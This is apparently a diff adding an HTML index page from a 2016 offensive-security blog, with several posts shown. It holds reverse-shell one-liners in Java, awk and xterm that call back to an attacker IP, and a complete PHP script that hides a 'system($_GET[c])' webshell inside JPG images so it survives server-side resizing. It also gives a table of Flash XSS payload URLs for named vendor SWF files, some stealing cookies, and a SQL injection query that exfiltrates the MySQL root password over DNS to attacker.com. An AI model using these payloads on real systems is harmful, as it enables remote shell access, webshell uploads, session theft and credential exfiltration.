+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Xnest :1</span><br><span class="line">&gt; xhost +&lt;IPTARGET&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; xterm -display &lt;IP&gt;:1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; /usr/openwin/bin/xterm -display &lt;IP&gt;:1</span><br></pre></td></tr></table></figure>
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/awk -f</span><br><span class="line">BEGIN &#123;</span><br><span class="line">s = &quot;/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;&quot;</span><br><span class="line">while(42) &#123;</span><br><span class="line">do&#123;</span><br><span class="line">printf &quot;shell&gt;&quot; |&amp; s</span><br><span class="line">s |&amp; getline c</span><br><span class="line">if(c)&#123;</span><br><span class="line">while ((c |&amp; getline) &gt; 0)</span><br><span class="line">print $0 |&amp; s</span><br><span class="line">close(c)</span><br><span class="line">&#125;</span><br><span class="line">&#125; while(c != &quot;exit&quot;)</span><br><span class="line">close(s)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; awk &apos;BEGIN &#123;s = &quot;/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&apos; /dev/null</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/" itemprop="url">
+                  Bypass imagecopyresampled and imagecopyresized generate PHP Webshell 
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-17T23:51:13+08:00" content="2016-06-17">
+              2016-06-17
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>修改如下png为php扩展</p>
+</blockquote>
+<p><a href="https://www.idontplaydarts.com/images/xsspng.png" target="_blank" rel="external">XSSPNG</a><br><a href="https://www.idontplaydarts.com/images/phppng.png" target="_blank" rel="external">PHPPNG</a></p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	/*</span><br><span class="line"></span><br><span class="line">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">	It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">	1) Upload an arbitrary image via secured files upload script</span><br><span class="line">	2) Save the processed image and launch:</span><br><span class="line">	jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">	Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">	1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">	2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.</span><br><span class="line">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">	Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">	See also:</span><br><span class="line">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">	*/</span><br><span class="line"></span><br><span class="line">	$miniPayload = &apos;&lt;?php system($_GET[c]);?&gt;&apos;;</span><br><span class="line"></span><br><span class="line">	if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) &#123;</span><br><span class="line">    	die(&apos;php-gd is not installed&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(!isset($argv[1])) &#123;</span><br><span class="line">		die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">	for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = new DataInputStream($argv[1]);</span><br><span class="line">		$outStream = file_get_contents($argv[1]);</span><br><span class="line">		$extraBytes = 0;</span><br><span class="line">		$correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">		if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">			die(&apos;Incorrect SOI marker&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - 2;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			if($marker === 0xDA) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp =</span><br><span class="line">					substr($outStream, 0, $startPos) .</span><br><span class="line">					$miniPayload .</span><br><span class="line">					str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .</span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">				if($extraBytes !== 0) &#123;</span><br><span class="line">					while((!$dis-&gt;eof())) &#123;</span><br><span class="line">						if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">							if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">								break;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream =</span><br><span class="line">						substr($outStream, 0, $startPos) .</span><br><span class="line">						$miniPayload .</span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							0,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) .</span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; elseif($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) &#123;</span><br><span class="line">					die(&apos;Success!&apos;);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(&apos;payload_&apos;.$argv[1]);</span><br><span class="line">	die(&apos;Something\&apos;s wrong&apos;);</span><br><span class="line"></span><br><span class="line">	function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">		global $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = TRUE;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		if($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		return $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">		global $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = FALSE;</span><br><span class="line">		if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) &#123;</span><br><span class="line">			if(isset($m[1])) &#123;</span><br><span class="line">				$extraBytes = (int)$m[1];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class DataInputStream &#123;</span><br><span class="line">		private $binData;</span><br><span class="line">		private $order;</span><br><span class="line">		private $size;</span><br><span class="line"></span><br><span class="line">		public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">			$this-&gt;binData = &apos;&apos;;</span><br><span class="line">			$this-&gt;order = $order;</span><br><span class="line">			if(!$fromString) &#123;</span><br><span class="line">				if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					die(&apos;File not exists [&apos;.$filename.&apos;]&apos;);</span><br><span class="line">				$this-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				$this-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			$this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function seek() &#123;</span><br><span class="line">			return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function skip($skip) &#123;</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function readByte() &#123;</span><br><span class="line">			if($this-&gt;eof()) &#123;</span><br><span class="line">				die(&apos;End Of File&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">			return ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function readShort() &#123;</span><br><span class="line">			if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">				die(&apos;End Of File&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">			if($this-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				$short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">			&#125;</span><br><span class="line">			return $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function eof() &#123;</span><br><span class="line">			return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/17/Flash-files-Vulnerable-Payload/" itemprop="url">
+                  Flash files Vulnerable Payload
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-17T11:27:37+08:00" content="2016-06-17">
+              2016-06-17
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro" target="_blank" rel="external">https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro</a></p>
+<h4 id="Flashbang"><a href="#Flashbang" class="headerlink" title="Flashbang"></a>Flashbang</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/cure53/Flashbang --recursive</span><br><span class="line">&gt; cd Flashbang/shumway</span><br><span class="line">&gt; git submodule init</span><br><span class="line">&gt; make bootstrap</span><br><span class="line">&gt; python -m SimpleHTTPServer 80     # 在Flashbang目录下启动一个Web服务,访问http://127.0.0.1/src/flashbang.html</span><br></pre></td></tr></table></figure>
+<h4 id="FFDec"><a href="#FFDec" class="headerlink" title="FFDec"></a>FFDec</h4><p><a href="https://github.com/jindrapetrik/jpexs-decompiler/releases" target="_blank" rel="external">FFDec</a></p>
+<h4 id="Vul-function"><a href="#Vul-function" class="headerlink" title="Vul function"></a>Vul function</h4><h5 id="1-URLRequest"><a href="#1-URLRequest" class="headerlink" title="1) URLRequest"></a>1) URLRequest</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// as3.0 version</span><br><span class="line">navigateToURL(new URLRequest(link), &quot;_self&quot;);</span><br><span class="line">//as2.0 version</span><br><span class="line">getURL(link,&quot;_self&quot;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="2-ExternalInterface-call"><a href="#2-ExternalInterface-call" class="headerlink" title="2) ExternalInterface.call"></a>2) ExternalInterface.call</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123; __Flash__toXML(函数名(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/ExternalInterface_first.swf?func=a1lert(1))&#125;catch(e)&#123;alert(100)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(a1lert(1))&#125;catch(e)&#123;alert(100)&#125;// (&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br><span class="line"></span><br><span class="line">http://www.target.com/ExternalInterface_second.swf?par=1111\%22),al)&#125;catch(e)&#123;alert(1000)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(alert(&quot;1111\\&quot;),al&#125;catch(e)&#123;alert(1000)&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-htmlText"><a href="#3-htmlText" class="headerlink" title="3) htmlText"></a>3) htmlText</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_root.createTextField(&quot;Inputbox&quot;,0,20,20,320,240);</span><br><span class="line">_root.Inputbox.html=true;</span><br><span class="line">_root.Inputbox.htmlText=&quot;Welcome&quot; + _root.username;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/htmltext.swf?url=?username=&lt;a+href=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;click+here+to+win&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">&quot;Welcome &lt;a href=&quot;javascript:alert(XSS)&quot;&gt;click here to win&lt;/a&gt;&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="4-loadMovie-asfunction"><a href="#4-loadMovie-asfunction" class="headerlink" title="4) loadMovie(), asfunction()"></a>4) loadMovie(), asfunction()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_root.loadMovie(_root.movietoload)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/FlashApp.swf?movietoload=http://hackerdomain/hackedFlash.swf</span><br></pre></td></tr></table></figure>
+<h4 id="5-ExternalInterface-addCallback"><a href="#5-ExternalInterface-addCallback" class="headerlink" title="5) ExternalInterface.addCallback()"></a>5) ExternalInterface.addCallback()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.addCallback(&apos;throwException&apos;,</span><br><span class="line">     function(s) &#123;</span><br><span class="line">       throw new Error(s)</span><br><span class="line">     &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><table>
+<thead>
+<tr>
+<th>Vendor</th>
+<th>url</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Zeroclipboard</td>
+<td>/zeroclipboard.swf?id=\”))}catch(e){alert(1);}//&amp;width=500&amp;height=500&amp;.swf</td>
+</tr>
+<tr>
+<td>JW Player</td>
+<td>/player.swf?playerready=alert(document.cookie)</td>
+</tr>
+<tr>
+<td>JW Player</td>
+<td>/player.swf?tracecall=alert(document.cookie)</td>
+</tr>
+<tr>
+<td>Custom</td>
+<td>/banner.swf?clickTAG=javascript:alert(1);//</td>
+</tr>
+<tr>
+<td>SwfUpload v2.2.0.1</td>
+<td>/swfupload.swf?movieName=”]);}catch(e){}if(!self.a)self.a=!alert(1);//</td>
+</tr>
+<tr>
+<td>YUI2</td>
+<td>/io.swf?yid=\”));}catch(e){alert(1);}//</td>
+</tr>
+<tr>
+<td>Jplayer</td>
+<td>/Jplayer.swf?jQuery=confirm&amp;id=Your information.’)*confirm(document.cookie%2b’&amp;vol=0.8&amp;muted=false&amp;.swf</td>
+</tr>
+<tr>
+<td>player</td>
+<td>/player.swf?playerID=a\%22%29%29}catch%28e%29{alert%28document.domain%29}//</td>
+</tr>
+<tr>
+<td>uploader</td>
+<td>/uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//</td>
+</tr>
+<tr>
+<td>tagcloud</td>
+<td>/tagcloud.swf?mode=tags&amp;tagcloud=%3Ctags%3E%3Ca+href=’<a href="http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E" target="_blank" rel="external">http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E</a></td>
+</tr>
+<tr>
+<td>open-flash-chart</td>
+<td>/open-flash-chart.swf?get-data=(function(){alert(/hello/)})()</td>
+</tr>
+<tr>
+<td>io</td>
+<td>/io.swf?yid=\”));}catch(e){alert(9)}//</td>
+</tr>
+<tr>
+<td>uploadify</td>
+<td>/uploadify.swf?buttonText=%3Ca%20href=%27javascript:alert%289%29%27鈥�%3ETest%3C/a%3E</td>
+</tr>
+<tr>
+<td>downloadify</td>
+<td>/downloadify.swf?queue_name=%22))}catch(e){}if(!self.a)self.a=!alert(‘XSS’);//&amp;width&amp;height&amp;downloadImage=<a href="http://www.google.co.in/images/srpr/logo4w.png" target="_blank" rel="external">http://www.google.co.in/images/srpr/logo4w.png</a></td>
+</tr>
+<tr>
+<td>flvPlayer</td>
+<td>/flvPlayer.swf?flvToPlay=xss.xml</td>
+</tr>
+<tr>
+<td>aflax</td>
+<td>/aflax.swf?callback=alert(9)</td>
+</tr>
+<tr>
+<td>redirect</td>
+<td>/redirect.swf?url=javascript:alert(9);</td>
+</tr>
+<tr>
+<td>finnor</td>
+<td>/finnor.swf?clickTag=javascript:alert(1);</td>
+</tr>
+<tr>
+<td>Vulnerable</td>
+<td>/vulnerable.swf?htmlVar=%3Ca%20href%3D%22asfunction%3AgetURL%2Cjavascript%3Aalert%28%27gotcha%21%27%29%22%3E%20Click%20here%3C%2fa%3E</td>
+</tr>
+<tr>
+<td>Pie3D</td>
+<td>/Pie3D.swf?dataURL=xss.xml</td>
+</tr>
+<tr>
+<td>link_protocol_test [only firefox]</td>
+<td>/link_protocol_test.swf?input=data%3Atext%2fhtml%3Btext%2C%3Cscript%3Ealert%28document.domain%29%3B%3C%2fscript%3E%2f%2f</td>
+</tr>
+<tr>
+<td>flashmediaelement &lt; v2.21.1</td>
+<td>/flashmediaelement.swf?jsinitfunctio%gn=alert<code>1</code></td>
+</tr>
+</tbody>
+</table>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/14/DNS-exfiltration-with-SQL-Injection/" itemprop="url">
+                  DNS exfiltration with SQL Injection
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-14T02:58:57+08:00" content="2016-06-14">
+              2016-06-14
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD_FILE(&apos;&lt;filepath&gt;&apos;)   # reads the file content and returns it as a string</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.attacker.com\\foobar&apos;));</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/06/14/DNS-exfiltration-with-SQL-Injection/#more" rel="contents">
+              Weiterlesen &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
